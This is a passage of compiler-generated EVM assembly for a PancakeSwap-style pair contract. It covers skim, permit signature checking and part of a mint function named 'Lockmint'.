*/\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n      0x20\n      swap3\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17896:17902  token0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18080  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_261\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_261:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18080  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_262\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_262:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18080  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_263\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_263:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18080  IERC20(_token0).balanceOf(address(this)) */\n      mload\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18094  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18084  IERC20(_token0).balanceOf(address(this)).sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18094  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      and\n      jump\t// in\n    tag_260:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17976:17989  _safeTransfer */\n      tag_142\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17976:18104  _safeTransfer(... */\n      jump\t// in\n    tag_259:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18223:18231  reserve1 */\n      sload(0x0b)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18178:18218  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18212:18216  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18178:18218  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18114:18242  _safeTransfer(... */\n      tag_264\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18141:18148  _token1 */\n      dup5\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18162:18164  to */\n      dup8\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18178:18232  IERC20(_token1).balanceOf(address(this)).sub(reserve1) */\n      tag_260\n      swap3\n      shl(0x70, 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18223:18231  reserve1 */\n      swap1\n      div\n      sub(shl(0x70, 0x01), 0x01)\n      and\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18178:18203  IERC20(_token1).balanceOf */\n      dup7\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18178:18218  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n      0x20\n      swap3\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18178:18203  IERC20(_token1).balanceOf */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18178:18218  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_261\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18114:18242  _safeTransfer(... */\n    tag_264:\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1379:1380  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1376  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1380  unlocked = 1 */\n      sstore\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17828:18249  function skim(address to) external lock {... */\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":672:694  address public factory */\n    tag_112:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x07))\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":727:748  address public token1 */\n    tag_114:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x09))\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3517:4481  function permit(... */\n    tag_117:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3730:3745  block.timestamp */\n      timestamp\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3718:3726  deadline */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3718:3745  deadline >= block.timestamp */\n      lt\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3710:3766  require(deadline >= block.timestamp, \"Pancake: EXPIRED\") */\n      tag_270\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x10\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x82, 0x14185b98d85ad94e8811561412549151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_270:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3878:3894  DOMAIN_SEPARATOR */\n      sload(0x04)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4128  nonces[owner] */\n      dup1\n      dup10\n      and\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3776:3790  bytes32 digest */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4128  nonces[owner] */\n      dup2\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4121  nonces */\n      0x05\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4128  nonces[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4130  nonces[owner]++ */\n      dup1\n      sload\n      0x01\n      dup1\n      dup3\n      add\n      swap1\n      swap3\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3943:4186  abi.encode(... */\n      dup3\n      mload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":748:814  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3943:4186  abi.encode(... */\n      dup2\n      dup7\n      add\n      mstore\n      dup1\n      dup5\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      swap6\n      dup14\n      and\n      0x60\n      dup7\n      add\n      mstore\n      0x80\n      dup6\n      add\n      dup13\n      swap1\n      mstore\n      0xa0\n      dup6\n      add\n      swap6\n      swap1\n      swap6\n      mstore\n      0xc0\n      dup1\n      dup6\n      add\n      dup12\n      swap1\n      mstore\n      dup2\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup7\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap2\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3943:4186  abi.encode(... */\n      0xe0\n      dup6\n      add\n      dup3\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3912:4204  keccak256(... */\n      dup1\n      mload\n      swap1\n      dup4\n      add\n      keccak256\n      shl(0xf0, 0x1901)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3816:4218  abi.encodePacked(... */\n      0x0100\n      dup7\n      add\n      mstore\n      0x0102\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      0x0122\n      dup1\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      dup1\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup6\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap7\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup7\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3816:4218  abi.encodePacked(... */\n      0x0142\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3793:4228  keccak256(... */\n      dup7\n      mload\n      swap7\n      dup4\n      add\n      swap7\n      swap1\n      swap7\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4265:4291  ecrecover(digest, v, r, s) */\n      swap6\n      dup4\n      swap1\n      mstore\n      0x0162\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n      dup7\n      swap1\n      mstore\n      0xff\n      dup10\n      and\n      0x0182\n      dup6\n      add\n      mstore\n      0x01a2\n      dup5\n      add\n      dup9\n      swap1\n      mstore\n      0x01c2\n      dup5\n      add\n      dup8\n      swap1\n      mstore\n      mload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3776:3790  bytes32 digest */\n      swap2\n      swap4\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4130  nonces[owner]++ */\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4265:4291  ecrecover(digest, v, r, s) */\n      0x01e2\n      dup1\n      dup3\n      add\n      swap4\n      not(0x1f)\n      dup2\n      add\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4130  nonces[owner]++ */\n      dup6\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4265:4291  ecrecover(digest, v, r, s) */\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_271\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_271:\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4265:4291  ecrecover(digest, v, r, s) */\n      mload(add(not(0x1f), mload(0x40)))\n      swap2\n      pop\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4322:4352  recoveredAddress != address(0) */\n      dup2\n      and\n      iszero\n      dup1\n      iszero\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4322:4381  recoveredAddress != address(0) && recoveredAddress == owner */\n      tag_272\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4376:4381  owner */\n      dup9\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4356:4381  recoveredAddress == owner */\n      and\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4356:4372  recoveredAddress */\n      dup2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4356:4381  recoveredAddress == owner */\n      and\n      eq\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4322:4381  recoveredAddress != address(0) && recoveredAddress == owner */\n    tag_272:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4301:4433  require(... */\n      tag_273\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1a\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a20494e56414c49445f5349474e4154555245000000000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_273:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4443:4474  _approve(owner, spender, value) */\n      tag_274\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4452:4457  owner */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4459:4466  spender */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4468:4473  value */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4443:4451  _approve */\n      tag_183\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4443:4474  _approve(owner, spender, value) */\n      jump\t// in\n    tag_274:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3517:4481  function permit(... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6399:7680  function Lockmint(address to) external lock returns (uint liquidity) {... */\n    tag_120:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6452:6466  uint liquidity */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1300  unlocked */\n      sload(0x0f)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1304:1305  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1305  unlocked == 1 */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1284:1325  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_276\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_276:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1343  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1347  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6521:6534  getReserves() */\n      tag_278\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6521:6532  getReserves */\n      tag_54\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6521:6534  getReserves() */\n      jump\t// in\n    tag_278:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6582:6588  token0 */\n      sload(0x08)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6608:6612  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6478:6534  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap4\n      swap6\n      pop\n      swap2\n      swap4\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6559:6572  uint balance0 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6582:6588  token0 */\n      swap1\n      swap2\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6599  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6582:6588  token0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_279\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_279:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_280\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_280:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_281\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_281:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6647:6653  token1 */\n      sload(0x09)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6679  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6673:6677  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6679  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      swap3\n      swap4\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6624:6637  uint balance1 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6647:6653  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6664  IERC20(token1).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6679  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6575:6614  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6679  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6647:6653  token1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6679  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_282\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_282:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6679  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_283\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_283:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6679  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_284\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_284:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6640:6679  IERC20(token1).balanceOf(address(this)) */\n      mload\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6689:6701  uint amount0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6704:6727  balance0.sub(_reserve0) */\n      tag_285\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6704:6712  balance0 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6704:6727  balance0.sub(_reserve0) */\n      dup8\n      and\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6704:6716  balance0.sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6704:6727  balance0.sub(_reserve0) */\n      and\n      jump\t// in\n    tag_285:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6689:6727  uint amount0 = balance0.sub(_reserve0) */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6737:6749  uint amount1 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6752:6775  balance1.sub(_reserve1) */\n      tag_286\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6752:6760  balance1 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6752:6775  balance1.sub(_reserve1) */\n      dup8\n      and\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6752:6764  balance1.sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6752:6775  balance1.sub(_reserve1) */\n      and\n      jump\t// in\n    tag_286:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6737:6775  uint amount1 = balance1.sub(_reserve1) */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6786:6796  bool feeOn */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6799:6829  _mintFee(_reserve0, _reserve1) */\n      tag_287\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6808:6817  _reserve0 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6819:6828  _reserve1 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6799:6807  _mintFee */\n      tag_204\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6799:6829  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_287:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6839:6856  uint _totalSupply */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6859:6870  totalSupply */\n      sload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6786:6829  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6962:6979  _totalSupply == 0 */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6958:7357  if (_totalSupply == 0) {... */\n      tag_288\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7007:7061  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      tag_289\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":556:563  10 ** 3 */\n      0x03e8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7007:7038  Math.sqrt(amount0.mul(amount1)) */\n      tag_169\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7017:7037  amount0.mul(amount1) */\n      tag_208\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7017:7024  amount0 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7029:7036  amount1 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7017:7037  amount0.mul(amount1) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7017:7028  amount0.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7017:7037  amount0.mul(amount1) */\n      and\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7007:7061  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n    tag_289:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6995:7061  liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      swap9\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7075:7116  freezeMint(address(0), MINIMUM_LIQUIDITY) */\n      tag_292\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7094:7095  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":556:563  10 ** 3 */\n      0x03e8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7075:7085  freezeMint */\n      tag_293\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7075:7116  freezeMint(address(0), MINIMUM_LIQUIDITY) */\n      jump\t// in\n    tag_292:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":6958:7357  if (_totalSupply == 0) {... */\n      jump(tag_294)\n    tag_288:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7214:7346  Math.min(... */\n      tag_295\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7240:7277  